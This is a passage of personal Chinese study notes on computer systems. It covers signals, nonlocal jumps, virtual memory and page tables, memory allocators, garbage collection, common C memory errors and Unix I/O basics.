提供的这个类型的变量，它的读和写会是原子性的（不可中断的）的；但是，原子性只适合于单条指令的数据更新，不适用于多条指令组成的数据更新； 正确的信号处理 由于信号的不排队机制，因此应该避免使用信号来对其他进程中的事件进行计数，不然结果并不准确； 可移植的信号处理 不同操作系统对系统处理的定义不同，导致相同方法在不同操作系统中具备不同的效果； 通过引入一个 signal 的包装函数，在包装函数中使用 sigaction 函数，明确指定具体的一种信号处理语义，从而达到统一的效果； 同步流以避免讨厌的并发错误 由于父进程和子进程是并发执行的，因此无法保证它们的执行顺序；为了确保它们能够按照某种指定的顺序执行，可以通过暂时阻塞某种类型信号，保证某个操作全部执行完毕后，再解除对该信号的阻塞，这样可以使得一些依赖于该信号的操作，不会提前发生； 显式的等待信号 可以通过 while 循环或者 pause 或者 sleep 的方式来等待信号，但是它们都有各自的缺点 while 需要一直消耗资源； pause 则会产生竞争，即 while 开始后 pause 开始前如果收到信号，会导致 pause 后永远无法再收到信号，因为信号一直阻塞在待处理集合中； sleep 则性能太差了，它的单位是按秒 nanosleep 虽然可以将单位做到纳秒，但是由于无法确定信号发生的间隔时间，间隔太小，浪费资源；间隔太大，性能不好； 解决办法是引入 sigsuspend 函数 #include &lt;signal.h&gt; int sigsuspend(const sigset_t *mask); 它的工作原理是先使用 mask 集合替代当前的 block 集合，这样可以放信号进来；待信号进来后，捕获它并恢复到以前的 block 集合；也就是说，不管信号是 suspend 之前发生还是之后发生，都会被捕获，不存在竞争；而且由于 suspend 的等待是阻塞的，它不会消耗资源，不存在性能问题； 非本地跳转 通常情况下，函数的调用和返回是通过栈来进行的，即进栈和出栈；C 语言提供了一种可以跨栈的跳转方式，叫非本地跳转(nonlocal jump)；它可以将控制从一个函数直接转移到另一个当前正在执行的函数，而不需经过栈；它的一个使用场景就是深层嵌套函数的跳出立即返回； 通过 setjump 和 longjump 两个函数配套使用来实现非本地跳转的功能； #include &lt;setjmp.h&gt; int setjmp(jmp_buf env); 用于在 env 缓冲区中保存当前的调用环境，包括程序计数器、栈指针、通用目的寄存器； setjmp 会返回两次，第一次发生调用后；第二次发生在对应的 longjmp 被调用后； setjmp 返回的值不能被赋予某个变量，只能直接使用，无法通过变量储存； int sigsetjmp(sigjmp_buf env, int savesigs); &#x2F;&#x2F; 用于信号处理的版本 void longjmp(jmp_buf env, int retval); &#x2F;&#x2F; 用来从 env 缓冲区恢复调用环境，并触发一个 setjmp 函数的返回，返回值为 retval； void siglongjmp(sigjmp_buf env, int retval); &#x2F;&#x2F; 用于信号处理的版本 longjmp 的跳转由于绕过了栈，因此可能存在内存泄露的隐患，因为在中间栈过程中创建分配的数据结构可能没有回收，它们原本可能在中间函数末尾的代码中进行回收的； 非本地跳转还有另外一个使用场景是让信号处理程序跳转到某个指定的位置，而不是原指令中断处；例如可以用来处理用户的键盘中断信号；但是，由于 setjmp 本身不是信号异步安全的，而 longjmp 又可以跳转到任意的代码位置，因此，有必要确保 longjmp 跳转后的位置之后中的代码，是信号异步安全的； Java 和 C++ 实现了更高抽象层次的 setjmp 和 longjmp 版本，分别类似其中的 catch 子句和 throw 子句； 操作进程的工具 STRACE：打印一个正在运行的程序和它的子程序做出各自系统调用的记录； 经过测试，执行一个简单 hello world 的 C 程序，涉及的系统调用包括 execve 加载代码 brk 移动栈指针分配和回收内存 access 检查文件权限 openat 加载链接器动态库 mmap 映射虚拟内存 read 读取文件描述符中的内容 mprotect 保护内存段； close 关闭文件描述符 fstat 获取文件状态； munmap 取消虚拟内存映射 write 输出内容到文件描述符中 exit_group 结束所有线程； PS：列出当前系统中的进程（包括僵死进程）； TOP：打印当前进程资源使用的信息； PMAP：显示进程的内存映射； &#x2F;proc：一个虚拟文件系统，用来输出内核数据结构的内容，用户程序可以读取这些内容； 虚拟内存 物理和虚拟寻址 物理寻址：CPU 指令中的地址即为内存的物理地址，通过内存总线直接给内存控制器进行寻址； 虚拟寻址：CPU 指令中的地址是虚拟地址，需要先翻译成物理地址后，才能发给内存控制器寻址； 实现原理：CPU 芯片上有个 MMU 内存管理单元的硬件，同时配合操作系统存放在内存中的查询表（页表, page table），来完成翻译的工作； 页表负责保存虚拟地址和物理地址之间的映射关系； 这个机制有三个重要的功能 通过虚拟页映射磁盘上的文件，当试图访问这些块时，触发缺页异常，然后再从磁盘读入数据； 简化了内存管理，从而简化了链接、进程间共享数据、进程的内存分配，以及程序加载； 通过在页表条目加入保护位，实现了内存保护； 地址空间 地址空间：一个非负的整数集合； 虚拟地址是由 CPU 生成的；物理地址空间则对应物理内存，因此每个物理地址是唯一的，但它可以被多个虚拟地址映射； 虚拟内存作为缓存工具 虚拟内存，在概念上是存储在磁盘上的连续的数组； 注意：在存储器层次结构中，磁盘的层级是低于内存的；因此，内存可以视为磁盘的上一层缓存； 磁盘上的数据被切割成块，这些块作为与更高一层的主存之间的传输单元； 每个块称为一个虚拟页 visual page VP，物理内存也被分割物物理页 physical page PP，二者的大小是一样的，P &#x3D; 2p； 在 CPU 指令里，只有虚拟内存，物理内存也是不存在的，它只是逻辑上的缓存，CPU 除了寄存器外，只跟虚拟内存打交道 而实际磁盘上的所有数据，有些是在物理磁盘上，有些是在网络上，有些是在物理内存中，但 CPU 不管它们在哪里；CPU 指令中的地址，全部是虚拟内存地址； 虚拟页面由三个集合组成 未分配：VM 系统未分配的页，不占空间，也无数据 未缓存：VM 系统已分配的页，未缓存，有数据，不占空间； 已缓存：VM 系统已分配的页，已缓存，有数据，占空间； 由于物理磁盘与 DRAM 之间巨大的访问时间差，所以对物理磁盘的操作，总是使用写回，而非直写；同时，由于不命中惩罚的开销很大，所以虚拟页一般设计的比较大(4KB - 2MB)，以降低不命中的概率； DRAM 缓存使用全相联的结构，那么意味着缓存中的任意一行，都可以存放任意一个虚拟页；完全是无序的；同样意味着替换策略的选择变得很重要； 看上去，页表是固定顺序排列的，即根据索引号计算偏移量，就可以得到对应的条目。但这样一条，貌似这个页表需要挺大的哦； 假设存储一个物理地址需要8字节，那么这个页面岂不是要耗掉等大的内存？ 是很大，不过可以通过多级页表来解决； 缺页：即缓存不命中； 处理过程： 根据页表有效位发现未缓存，触发缺页异常； 内核收到异常信号，调用缺页异常处理程序 假设物理内存未满，下一步； 假设物理内存已满，选择一个牺牲页，查找其数据是否修改， 若已修改，将其复制到磁盘；下一步； 若未修改，下一步； 缺页异常处理程序前往磁盘复制数据，存放到物理内存中，更新页表，然后返回信号； CPU 收到信号，继续原中断的进程，执行原导致缺页的指令，再次前往页表查询物理内存地址，随后到高速缓存中读取数据； 目前的计算机都采用按需页面调度，即仅在发生不命中时，才会去换入页面；而不会尝试预测不命中，然后提前换入； 分配页面 当调用 malloc 指令时，内核在虚拟内存上分配空间，然后更新页表，使其指向这个空间； 但此时对应的物理地址应该仍是空的，一直到等到需要写入数据时，页表的物理地址栏才会有值； 当程序小于物理内存时，虚拟内存将工作得很好，不容易发生频繁的页面调度（即抖动 thrashing），原因在于程序的局部性 locality 特性，这个特性使得程序总是趋向于访问某个较小的特定页面上的数据集合，叫工作集 working set，或者常驻集合 resident set； linux 下有个工具 getrusage 函数，可以用来查看缺页的数量； 虚拟内存作为内存管理工具 实际上操作系统为每个进程分配了一个独立的页表和独立的虚拟地址空间 这个机制有很大的作用，有如下的好处 简化链接：链接器在生成可执行文件的时候，可以使用统一的格式为每个可执行文件分配虚拟地址，不必考虑其他程序，简化了链接器的工作； 简化加载：加载器为目标文件的代码节和数据节分配虚拟页，把它们标记为未缓存，然后更新页表条目，使其指向目标文件中对应的位置； 但加载器并不实际复制数据；数据的实际复制，要等到数据被引用时，发现未缓存触发缺页异常时，才会发生； 简化共享：每个进程私有自己的数据，但操作系统通过页表的映射，可以为它们之间实现物理上的共享； 操作系统如何知道某些文件已经被其他进程加载到物理内存中了？通过缓存的机制来判断，因为在加载文件时，进程最初给出的是虚拟地址，此地址之后被翻译成对应物理磁盘上的某个位置，得到磁盘物理地址，然后此物理地址里面的内容如果在之前已经被其他进程加载过，就会出现在缓存中（即物理内存和高速缓存），所以当前进程就不需要重复加载磁盘上的文件了，直接返回缓存中的内容即可； 简化内存分配：在虚拟地址空间中，内存可以是连续分配的；但在物理空间中，它们其实可以随机分散存储； 虚拟内存作为内存保护工具 通过在页表中添加许可位，可以很方便的实现权限控制，例如角色位、读位、写位； 当进程尝试访问没有权限的条目时，就会触发段错误 segmentation fault； 地址翻译 刚发现页表并不需要映射物理内存为的每个字节，而只需要映射每个页即可；而一个页有 4KB-2MB，所以其实页表要比物理内存的容量小得多；至少差距4000-2百万倍； CPU 中有一个寄存器用来保存页表在内存中的地址（位置）；有了这个地址，就可以读取内存中的页表了； 这个寄存器叫做页表基址寄存器, PTBR page table base register； CPU 对 SRAM 的访问，可以使用虚拟地址，也可以使用物理地址，目前大多数操作系统都使用物理寻址；因为这种方式使得进程间共享数据变得很方便； 但物理寻址带来的问题是访问 SRAM 之前，需要先使用 MMU 内存管理器对虚拟地址进行翻译，这需要消耗时间，尤其是没有命中的时候，就会导致需要从内存读取两次数据；（为什么需要读两次数据？答：第一次根据虚拟地址从内存中读页表获取物理地址，第二次根据物理地址，从内存中读取目标数据） 为了克服这个缺点，MMU 引入了一个关于 PTE 的小缓存，来加快自己的翻译工作； PTE：page table entry，页表上面的条目； 这个小缓存叫做 TLB，翻译后备缓冲器，translation lookaside buffer； 这个机制再次利用了局部性原理对 PTE 翻译工作进行缓存加速； 多级页表 背景：页表占用的空间不小，32位地址空间，4KB 页面，4字节PTE的系统，单级页表的话，约需要 4MB 的空间；对于 64 位地址空间，就更大了，对它进行缓存显然成本很高，为了应对这个问题，引入了多级页表的方法； 多页表的技术非常有意思，它的原理是对虚拟地址空间进行分段，每段的大小固定，然后每段用一个小页表来映射，最后再用一个上级的小页表来映射所有下级的小页表； 优点：无效条目得以尽量挤掉； 缺点：每一次的翻译工作都需要两次（两级页表）或多次查找（多级页表） 对于 4GB 的内存，二级页表的一页有1024个条目，可以映射 1024 个页，每个页 4KB，因此二级页表一个页可以映射 4MB地址空间，而一级页表的一个页的 1024个PTE，就可以映射全部 4GB 地址空间了； 感觉多级页表的地址分段，跟折半查询的思路有点类似； 一级页表 1024 个条目使用 4KB 空间，二级页表 1024 个条目使用 4KB 空间，这么合计起来只需要使用 8KB 的空间？那相对于单级页表设计需要 4MB 的空间，其提升还是相当惊人的； 通过 TLB 缓存技术，单次访问时间成本其实很小，因此实际上可以通过设计为很多级的页表结构，来降低对页表的缓存空间要求； Core i7 处理器设计为4级； CPU 运行一条数据加载指令的过程 指令给出的地址是虚拟地址，先通过 MMU 取出虚拟地址中的 TLB 标记位和索引位，然后到 TLB 缓存查询，若命中则返回 PPN PPN 和虚拟地址的 VPO 合并得到物理地址 PA，然后发给高速缓存； 高速缓存从物理地址 PA 中读取缓存的标记位和索引位，检查是否命中 若命中，根据 PA 的偏移位，从缓存块中得到数据，返回给CPU； 若不命中，则触发异常，前往主存中复制数据到缓存； 案例研究 每个进程都有自己的私有页表层次结构；当分配了页后，页表便开始驻留在内存中；同时也有一份缓存在 TLB 中；这样 CPU 在进行进程切换的时候，通过重置 CR3 控制寄存器的值，让其指向每个进程第一级页表的起始位置； 如果 TLB 满了后，貌似就要有人做出牺牲了； 页表中的条目总共有64位（这么说有8个字节），其中有40位用来表示物理基地址的最高40位，其他的主要用来表示各类信息，包括权限、缓存策略、页大小、有效位、引用位、修改位等； 修改位：若页发生修改，则被牺牲进行覆盖前，需要先写回数据； 引用位：用于内核实现页替换算法； 在多级页表中，假设虚拟地址有48位，其中36位为 VPN（剩下12位刚好可以表示4KB 一个页的数据），采用四级页表，则这36位 VPN 会被分成4段，每段9位，每一段都为上一级的偏移量； CPU 在实际工作中，MMU 和高速缓存其实在同时工作，前者负责翻译得到 PPN 的值，后者负责从缓存中查找相同 PPO 对应的标记位的值，最后当二者都得到结果后，即可进行匹配；它们其实不是顺序执行的，而是并行的工作；这种方式提高了性能； 每个进程都有自己的虚拟地址空间，在栈以上的部分，属于内核虚拟内存，其中存放着： 内核代码和数据：每个进程都相同，它们会被映射到相同的物理内存页面； 物理内存：每个进程都相同； 这里是啥意思？答：这个设计非常有趣，虚拟内存中有一个连续的段，完全映射物理内存，二者大小一样； 为什么需要这个东西？答：为内核访问物理内存中任何特定的位置，提供了一种非常便利的方法；例如访问页表 怎么个便利法？当某些设备需要执行映射内存的 I&#x2F;O 操作时，可将这些设备映射到特定的物理内存位置；如果没有这个机制的话，则操作系统自动提供的位置将会是随机的； 与进程相关的数据结构：每个进程不同，包括页表、task结构、mm结构、内核栈等； 此部分记录着整个虚拟内存的结构信息； 每个进程使用一个 task_struct 来记录所有运行该进程的相关信息，例如 PID、指向用户栈的指针、可执行目标文件的名字、程序计数器等 task_struct 中有一个条目指向 mm_struct，mm_struct 用来描述虚拟内存的当前状态； mm_struct 中有两个字段 pgd：指向第一级页表的基址；当 CPU 运行当前进程时，就会加载 pgd 的值到 CR3 寄存器中； mmap：指向一个链表，这个链表由 vm_area_structs 组成； 每个 vm_area_structs 描述了虚拟内存中某个区域（段）的信息，包括如下字段 vm_start：区域起点； vm_end：区域终点 vm_prot：权限 vm_flags：一些标记信息，包括区域内的页面是否与其他进程共享，当前进程是否私有等； vm_next：指向下个 vm_area_structs 缺页处理程序的工具步骤 判断虚拟地址是否合法：即是否存在于区域结构链接表中的某个起始范围中；若非法，则抛出段错误； 由于链表的查找开销很大，实际上 Linux 系统会构造一个树，然后在树里面查找，这样快得多； 判断权限是否满足：即当前进程是否有读写这个区域的权限；若非法，则抛出保护异常； 内存映射 Linux 通过将某个虚拟内存区域（段）与某个磁盘上的对象映射起来，以便实现虚拟内存中的内容初始化 这个过程称为 memory mapping；不过貌似此时应该没有实现数据加载，加载要到缺页异常时才会触发； 这个映射信息保存在哪里？理论上要有一个文件描述符，指向磁盘上的这个对象 虚拟内存区域可以映射两种对象 Linux 文件系统中的普通文件； 匿名文件：它是由内核创建的，并不预先存在于文件系统中；一开始初始化为零（请求二进制零的页） 一直要等到这个匿名文件被 CPU 引用时，才会将它写入物理内存； 据说当一个虚拟页面被初始化以后，就会被一个由内核维护的的专门的交换文件（也叫交换空间或交换区域）之间换来换去，啥意思？ 写时复制：这个技术很有意思，当一个对象被标记为私有对象时，它仍然可以被多个进程映射并读取，仅当出现有一个进程尝试写它时，才会触发复制一本副本出来；然后实际上是数据是写到副本中的，而不是原来的对象；这样不会影响其他进程对原文件的读取（貌似这样可以最大程度的减少复制的工作，可以得到真正产生需要时再复制） 某个进程对共享对象的写操作，对其他进程是可见的；对私有对象的写操作，则是不可见的，因为事实上它并不是写在原对象上，而是写入了原对象的副本上（这个副本要到写时才会创建，即写时复制技术） fork 函数工作原理： 当调用 fork 函数时，内核会复制一份当前进程的 mm_struct、区域结构链表和页表的副本，这样两个进程就实现了数据的共享；但这些共享的数据都被标记成只读的，并且区域结构都会被标记为写时复制；当任意一个进程尝试写数据时，才会触发写时复制（亦即此时才会新开辟一片物理内存，映射到新进程的虚拟内存段）； execve 函数：内核通过这个函数来调用加载器，把可执行文件加载到内存中，工作步骤如下： 删除当前进程虚拟地址中的用户部分已经存在的区域结构 用户部分即虚拟地址空间中非内核的部分； 映射私有区域：为新程序的用户部分创建新的区域结构，标记为私有、写时复制（这么说在没有写之前，还是可以读到原来的数据的；不过不是在第一步的时候就删除了吗？还是说所谓的删除只是逻辑上的一种标记？）； 映射共享区域：假设有链接共享库，则会触发调用动态链接器，链接共享对象，然后映射到虚拟空间的共享区域中； 设置程序计数器：以便让下一指令的地址指向新进程的代码区域的入口点； 使用 mmap 函数创建用户级的内存映射 void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset) start 指虚拟内存中的起始位置，一般设置为 NULL，由内核自行决定位置；这个参数对内核仅为参考意义，它不一定遵守； length 要映射的内容长度； prot 权限： PROT_EXEC 可执行 PROT_READ 可读 PROT_WRITE 可写 PROT_NONE 不可访问 flags：被映射对象的描述信息 MAP_ANON 匿名对象 MAP_PRIVATE 私有对象 MAP_SHARED 共享对象 fd 文件描述符：它指向一个磁盘文件 offset：磁盘文件中的字节偏移量 若函数调用成功，将返回新区域的地址； 貌似此函数应该还会有更新页表的动作； 使用 munmap 删除虚拟内存的区域 int munmap(void *start, size_t length) start 指的是原 mmap 返回的虚拟内存区域的地址； 当虚拟内存区域被删除后，后续对它的引用会导致段错误； 动态内存分配 概念 创建虚拟内存区域除了使用 mmap 外，还可以使用动态内存分配器 dynamic memory allocator，在堆 heap 上创建空间来完成 堆的位置一般紧接着未初始化的 .bss 节之后，内核会为每个进程创建维护一个 brk 变量，指向堆的顶部位置； 注意堆的地址空间是从小到大向上生长的，所以堆顶的地址值是最大的； 但栈不同，栈的地址空间是从大到小向下生长的，所以栈顶的地址值其实是最小的； 有两种风格的分配器 显式分配器：要求程序员显式的回收已分配的资源 在 C 中使用 malloc 和 free；在 C++ 中使用 new 和 delete； 隐式分配器：由分配器自行检测资源不同使用，并释放回收； 所以隐式分配器也叫做垃圾回收器 garbage collector；自动释放回收的动作称为垃圾回收 garbage collection； LISP, ML, Java 等语言使用隐式分配器风格； malloc 和 free 函数 位于标准库头文件中 &lt;stdlib.h&gt; void *malloc(size_t size) 若成功则返回指向虚拟内存中已分配的块的指针；若失败则返回 NULL； 在编译代码时，若为 32 位模式，则 malloc 返回的地址为 8 的倍数；若为 64 位模式，则地址为 16 的倍数； 目的：地址对齐，以便减少获取数据的访问次数； malloc 分配的块并未初始化数据，若想初始化，应使用 calloc 函数； 若要改变已经分配的块的大小，则使用 realloc 函数； malloc 的实现方式有两种 方法一：通过 mmap 和 munmap 函数； 方法二：通过 sbrk 函数：void *sbrk(intptr_t incr) 原理：它通过改变内核中 brk 变量的值，在移动堆顶部的指针位置，从而获得或释放相应的空间； 若分配成功，返回 brk 的旧值；若分配失败，返回 -1； incr 可以是正值，也可以是负值；当 incr 是负值时，相当于释放空间了 当 incr 是负值时，若成功，返回的是 brk 的旧值，意味着这个值与新堆顶的值相距 abs(incr) 字节的距离； void free(void *ptr) free 函数的设计有缺陷，因为它没有返回值，意味着我们不知道它成功完成任务了没有；当我们传给它的地址参数是一个非法值时，它会产生未定义的行为； 为什么要使用动态分配内存？ 因为有些数据是在运行过程中，由外部传入的，但我们不知道外界传入的数据大小，没有办法提前为它们分配空间；若提前硬编码分配，太大会浪费空间，太小则有时会不够用； 因此，我们只好等数据传入前，根据数据大小，临时动态分配相应的空间；这样就可以比较灵活应对多种情况； 分配器的要求和目标 要求 只使用堆 立即响应请求 支持任意请求序列 不修改已分配的块； 块对齐； 目标 最大化吞吐量，即请求处理速度最大化； 最大化内存使用率：虚拟空间看似无限，实则受物理内存和交换空间的限制； 分配器的两个目标是相互冲突的，好的分配器设计方案需要在二者间取得平衡； 碎片 碎片现象(fragmentation) 会导致内存使用率降低；此时虽然有未使用的内存，但却无法响应分配请求； 两种碎片形式 内部碎片：分配的块的大小，比请求的大，即多分配一点（一般是为了满足对齐要求） 外部碎片：所有空闲加起来大于请求，但却没有单独一个空闲足够大能够满足请求； 外部碎片难以量化和预测，分配器一般使用启发式策略来管理块，即尽量维持少量的大空闲块，而不是维持大量的小空闲块； 实现问题，很有挑战性，需要考虑的事情如下： 如何记录空闲块； 如何选择一个合适的空闲块来放置新分配的块； 如何处理一个空闲块被部分使用之后的剩余部分； 如何处理一个刚被释放的块； 隐式空闲链表 一个块由头部(一个字)、有效荷载、填充(可选)等三部分组成； 双字对齐要求使得块的大小的最后3位固定为0，因此可以用这3个位来编码其他信息，最低位用来表示是否分配； 最后需要一个标记已分配且大小为0的块来表示终止； 分配器通过遍历块链表，来获知已分配块和空闲块，并进行块的分配； 链表的优点是实现起来很简单；缺点是每次分配都需要遍历，导致搜索时间呈现为块数量的线性函数，块越多，搜索时间越久； 双字对齐要求使得最小的块大小为两字节，即使只要求分配一个字节； 放置已分配的块，三种分配策略 第一次匹配：从链接起始处开始查询； 优点：大空闲块后置； 缺点：头部集中较多的小空闲块，增加了后续的搜索时间； 下一次匹配：从上一次查询结束的地方，开始查询； 优点：比首次匹配搜索时间少一些； 缺点：内存利用率较低； 最佳匹配；遍历整个链接，寻找最佳匹配的空闲块； 优点：内存利用率高； 缺点：费时； 分割空闲块：找到匹配的空闲块后有两种选择分配方法： 分割 不分割：缺点是内部碎片多，除非搜索策略是最佳匹配； 获取额外的堆内存 分配器优先从内核已给的堆内存中寻找空闲块进行分配工作； 如果找不到，就尝试合并所有空闲块进行分配； 如果合并后仍然不够，就调用 sbrk 函数让内核分配额外的堆内存； 这么说来，堆内存在程序运行过程中，是由内核来管理的，按需分配，而不是由程序自己自行预安排； 很好奇虚拟内存的分配，会如何影响到物理内存的分配？是否每个程序有义务要做好自己的内存最大化利用，尽量在少的内存空间中完成尽量多的事情？如何来保证这个机制的执行？ 合并空闲块 当出现两个相邻的空闲块时，分配器需要作合并动作，不然会产生一些假碎片； 两种合并策略 立即合并 优点：简单明了，可以在常数时间内完成； 缺点：在某些请求模式下，会触发抖动，即块会反复的合并，然后马上分割；例如在某个循环中，反复的分配和释放某个固定长度的块，就有可能导致这个释放和相邻的块产生反复的合并； 推迟合并：直到某个分配请求失败，再扫描整个堆，合并所有的空闲块； 带边界标记的合并：假设释放的块为当前块 合并下一个相邻空闲块最简单，只需要简单的将后续块的大小，加到前置块的头部的大小值上即可完成； 合并前面的空闲块 脚部：由于使用了链表结构，导致无法前向搜索，所以这里的设计，很机智的在每个块的尾部，新引入了一个字的脚部；脚部保留着和头部一样信息；这样一来，就可以通过往前定位一个字，得到前面块的信息，从而为合并前面块提供了巨大的便利； 缺点：增加了内存开销； 优化方法：如果前面是已分配的块，则并不能合并它；所以对于已分配的块，可以不用存储脚部，而是在其当前块的低位，预留一个位，用来表示前面块的是否已分配的信息；这样就可以节省很多内存，仅空闲块需要脚部；而空闲块本来就是没有使用的内存，所以也不存在内存占用； 综合：实现一个简单的分配器 需要定义的函数包括：初始化、堆扩展、块释放、块合并、块分配等； 需要定义的宏包括：字大小、生成头部、读取一个字、写入一个字、获取大小、获取分配位、获取头部指针、获取脚部指针、获取下一个块指针、获取前一个块指针； 显式空闲链表 由于空闲块中的数据不再使用，因此可以在里面增加一个双向链表，用来记录上一个和下一个空闲块的位置信息；这样在寻找空闲块的时候，就简化为在所有空闲块中寻找即可，不需要在已分配块中寻找； 代价是：释放一个块所需要的时间就可能不再是一个常数了，因为需要维护双向链接，除非选择合适的排序策略； 后进先出(LIFO)：last in first out，每次新释放的块，都放在双向链表的开始处； 优点：这样可以确保块释放时间仍是一个常数； 缺点：内存利用率较低； 按地址顺序排序，每个空闲的地址都小于它后继的空闲块地址 缺点：需要线性的时间定位合适的前驱； 优点：内存利用率比较高 显式链表的缺点：每个块现在需要保存四种信息，因此块的最小值需要更大一些；潜在的增加了内存碎片的程度； 分离的空闲链表 对于空闲块链表的搜索，与空闲块的数量呈线性关系；为了尽量提高性能，另一种方法是让分配器维护多组空闲块链表；每组之间按大小分类，分类的方法有很多种；总的原则是让空闲块的搜索变成根据需要的块大小，到对应的组中去搜索； 两种基本的分享存储的方法 简单分离存储：每个大小类，都包含相等大小的块，块大小即是类的上限；块不分割，不合并； 优点：分配和释放都可以常数时间完成；无须头部和脚部、无须分配位标记、最小块大小是一个字，内存利用率高 缺点：容易造成很多内部碎片，某些情况下，由于不合并策略，甚至会造成很多外部碎片； 分离适配：此方法通过让分配器单独维护一个空闲链表的数组来实现；数组中的每个空闲链表成员，和一个大小类相关联，并被组织成某种类型的显式或隐式链表，每个链表包含潜在大小的不同的块，这些块是大小类的成员；GNU malloc 包即是使用这种方法 优点：搜索时间较少，因为被限定在了局部块中，而不是整个堆；内存利用率也上升，近似于最佳匹配的内存利用率； 好奇这个数组存储在哪里？ 伙伴系统(buddy system) 它是分离适配的一种特殊，特殊在其块的大小统一设置为2的幂；当请求某个块时，先将块的大小向上舍入到最接近的2的幂，然后去链表中搜索；余下的跟分离适配一样； 优点：快速搜索，快速合并； 缺点：由于硬性规定大小需要是2的幂，会造成较多的内部碎片； 使用场景：不太适合于通用场景的机器，但对于已知块的大小一定会是2的幂的机器，则非常有吸引力； 垃圾收集 垃圾收集器的基本知识 垃圾收集器将内存视为一张有向可达图(reachablility graph)，它由一组根节点和很多堆节点组成，每个堆节点对应堆中的一个已分配的块，每个根节点则存储着指向堆中的指针（其位置可以是寄存器、栈或者全局变量等） 当存在一条从根节点出发，并到达 p 节点的路径时，我们称 p 节点时可达的；任何时刻下，如果 p 是不可达的，则它便是垃圾；垃圾收集器定期检查可达图里面的各个节点，当发现它是不可达，就释放它并返回给空闲链表； 由于 ML、JAVA 等语言对指针的使用有严格的规定（主要是因为指针在内存中存储有类型信息），因此其可达图的维护很精确，可以起到垃圾回收的效果；C&#x2F;C++ 对指针的使用不够严格（没有类似信息，依赖上下文），导致其可达图的维护有错，不能起到完全的垃圾回收效果，被称为保守的垃圾收集器； 收集器可以按需提供服务，或者也可以作为一个独立的线程，定期更新可达图和回收垃圾； Mark&amp;Sweep 垃圾收集器 由两个阶段组成 标记(mark)阶段：mark 函数 给定一个指向堆中的指针，返回其在堆中所在的块 b 的起始位置的指针； 若返回 NULL，结束； 若返回非 NULL，检查块是否已标记， 若已标记过，结束； 若未标记过，进行标记 读取 b 块的长度 遍历 b 块中的每一个字，递归调用 mark 函数，确保 b 块中的每个字，若指向其他块，则其他块也纳入检查范围； 清除(sweep)阶段：sweep 函数 遍历堆中的每一个块 若已标记，清除标记； 若未标记，检查是否已分配 若已分配，释放它； 若未分配，结束，开始检查下一个块； C 程序的保守 Mark&amp;Sweep C 的标记和清除模式不得不保守，因为在 C 的设计中，它没有机制保存类型信息，不同类型的变量，在内存中可能存储着相同的值，导致仅看内存中的值，无法区分类型，有可能这个值是一个 int 类型，也有可能是一个指针类型；这就导致 C 语言对 Mark&amp;Sweep 中的 isPtr 函数的实现需要如下另外设计； 将已分配块的集合，维护成一棵平衡二叉树，在左子树中所有块，都放在较小的地址处；右子树中的所有块，都放在较大的地址处； 在块的头部中，再多增加两个字段，每个字段指向某个已分配的块的头部； 调用 isPtr 时，它就用这棵树来查找，它根据块头部的大小字段，来判断当前的指针参数 p 是否在块中；如果在，则不释放；如果不在，则释放； 但这种方法有缺点，它可以核对哪些块从根节点出发是可达的，不会误删除有用的块，但它会错过一些其实已经不可达的块，导致增加了一些外部碎片的可能性； C 程序中常见的与内存有关的错误 间接引用坏指针 读未初始化的内存 例如错误的假设堆内存被初始化为零，事实上可以使用 calloc 来初始化为 0; 允许栈缓冲区溢出 例如使用 gets 函数读取字符串，它不限制长度，更好的做法应该是使用 fgets 函数； 假设指针和它们指向的对象是相同大小的 sizeof(int*) 和 sizeof(int) 是完全不一样的； 造成错位错误，即越界错误 引用指针，而不是它所指向的对象 指针的解引用运算符优先级很低，比常见的算术运算符低，所以应谨慎的使用括号来避免错误； 误解指针运算 指针的自增自减是以其自身指向对象的类型的大小来进行的，而不是字节为单位； 引用不存在的变量 例如返回栈中创建的变量的指针，而事实上这个栈中的变量在出栈的时候，就已经无效了，它非常短的时间内可能可以使用，便很快会被覆盖，从而造成不易察觉的错误； 引用空闲堆块中的数据 分配，释放，然后又出现了再次引用； 引起内存泄漏 忘了回收分配的内存，随着程序不断运行（例如服务器上的程序），最终会导致内存被用爆，导致了内存泄漏； 系统级 I&#x2F;O Unix I&#x2F;O 输入&#x2F;输出 I&#x2F;O 是主存和外部设备之间复制数据的过程； 所有的 I&#x2F;O 都被模型化为文件，而一个 Linux 文件就是一个由 m 个字节组成的序列；所有的输入和输出都被当作对文件的读和写； Unix I&#x2F;O 是 Linux 内核提供的接口； 打开文件：当应用程序请求打开某个文件时，内核会返回一个非负整数的文件描述符，用来在后续的操作中标识这个文件；内核会记录关于这个被打开文件的所有信息，而应用程序只需记住这个描述符； Linux shell 创建的每个进程开始时都有三个打开的文件，分别为标准输入、标准输出、标准错误，描述符分别为 0，1， 2；头文件&lt;unistd.h&gt; 中定义了三个宏变量名称来代替它们，分别为 STDIN_FILENO, STDOUT_FILENO, STDERR_FILENO； 改变当前的文件位置：通过 seek 函数可以改变在文件中的位置；内核会通过一个变量记住当前的文件位置，初始值为 0； 读写文件：对 m 字节的文件读取 k 字节的数据，当 k &gt; m 时，会触发 EOF (end of file) 的条件；应用程序可以检测到这个条件，但实际上文件的末尾处并没有 EOF 符号 好奇是如何触发的？ 关闭文件：应用程序请求关闭文件后，内核会恢复描述符到可用池中，并释放文件打开时创建的数据结构； 这么说内核在打开文件时，创建了一个数据结构，来临时存储文件的相关信息？ 文件 每个 Linux 文件都有一个类型(type) 来标识它在系统中的角色，常见的文件类型有： 普通文件：可以包含任意类型的数据； 文本文件：由文本行组成的序列，每行的末尾有一个换行符 \\n；每行的内容只由 ASCII 或 Unicode 字符组成； 二进制文件：非文本文件的，都叫做二进制文件； 目录文件：包含一组链接的文件；每个链接都将一个文件名映射到一个文件；这个文件可能是另外一个目录；每个目录中，即使是空的，也至少包含两个条目，分别是 “.” 和 “..”，即一个点和两个点，它们分别代表当前目录的链接和父目录的链接； 套接字文件：用来与另外一个进程进行跨网络通信的文件； 这么说，使用套接字的进程间通信，实际上是在做文件读写？是的 其他文件类型：命名通道(named pipe)，符号链接(symbolic link)，字符和块设备(character and block device)等； 消息队列估计应该也是一种文件类型； Linux 内核将所有文件都组织成一个目录层次结构，由根目录确定(以 “&#x2F;“ 表示根目录)，每个文件都是根目录的直接或间接的后代； 看起来每次创建一个新目录时，实际上做了两件事，一个是在父目录的文件中，增加一个链接；一个是在当前目录文件中，增加“.” 和 “..”两个链接； 每个进程都有一个当前工作目录(current working directory)，是其上下文的一部分； 这个上下文信息存在哪里呢？会不会是虚拟地址空间中的内核区？ 目录层次结构中的位置用路径名(pathname) 来指定 